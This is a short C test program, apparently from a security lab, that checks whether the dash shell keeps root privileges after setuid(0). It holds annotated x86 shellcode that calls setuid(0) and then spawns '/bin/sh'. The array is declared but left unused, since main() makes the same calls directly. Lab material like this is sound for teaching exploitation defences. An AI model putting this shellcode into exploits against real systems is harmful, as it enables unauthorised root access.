// dash_shell_test.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main() {

	char shellcode[]=
		"\x31\xc0"            /*Line 1: xorl     %eax,%eax*/
		"\x31\xdb"            /*Line 2: xorl     %ebx,%ebx*/
		"\xb0\xd5"            /*Line 3: movb     $0xd5,%al*/
		"\xcd\x80"            /*Line 4: int      $0x80*/
		"\x31\xc0"             /* xorl    %eax,%eax              */
		"\x50"                 /* pushl   %eax                   */
		"\x68""//sh"           /* pushl   $0x68732f2f            */
		"\x68""/bin"           /* pushl   $0x6e69622f            */
		"\x89\xe3"             /* movl    %esp,%ebx              */
		"\x50"                 /* pushl   %eax                   */
		"\x53"                 /* pushl   %ebx                   */
		"\x89\xe1"             /* movl    %esp,%ecx              */
		"\x99"                 /* cdq                            */
		"\xb0\x0b"             /* movb    $0x0b,%al              */
		"\xcd\x80"             /* int     $0x80                  */
	;
	
	char*argv[2];
	argv[0] = "/bin/sh";
	argv[1] = NULL;
	setuid(0);
	execve("/bin/sh", argv, NULL);
	return 0;
}
